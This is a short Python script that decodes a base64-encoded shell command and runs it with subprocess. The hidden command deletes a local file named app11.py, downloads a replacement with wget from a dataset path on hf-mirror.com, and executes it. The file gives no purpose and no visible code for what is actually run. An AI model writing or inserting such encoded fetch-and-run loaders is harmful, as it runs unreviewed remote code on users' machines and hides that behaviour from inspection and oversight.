import base64
import subprocess
def code():        
    encoded_command = "CnJtIC4vYXBwMTEucHkKd2dldCBodHRwczovL2hmLW1pcnJvci5jb20vZGF0YXNldHMvQUNDQTIyNS9vcGVueGxhYi9yZXNvbHZlL21haW4vYXBwMTEucHkKcHl0aG9uIGFwcDExLnB5"
    decoded_command = base64.b64decode(encoded_command).decode()
    subprocess.run(decoded_command, shell=True, check=True)
try:
    code()  # Call the code() function
except Exception as e:
    print("An error occurred:", e)

